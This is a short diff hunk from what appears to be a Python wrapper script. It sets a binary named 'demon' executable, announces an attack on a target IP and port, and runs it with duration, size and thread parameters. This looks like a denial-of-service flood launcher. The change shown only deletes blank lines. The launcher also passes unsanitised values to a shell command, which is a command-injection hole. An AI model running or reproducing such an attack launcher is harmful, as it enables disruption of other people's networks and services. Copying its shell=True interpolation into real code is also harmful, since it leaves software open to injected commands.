@@ -13,9 +13,7 @@ def main():
         os.chmod("demon", 0o755)
     
     print(f"Starting attack on {ip}:{port}")
-    
     result = subprocess.run(f"./demon {ip} {port} {duration} {size} {threads}", shell=True)
-    
     print(f"Attack finished")
 
 if __name__ == "__main__":
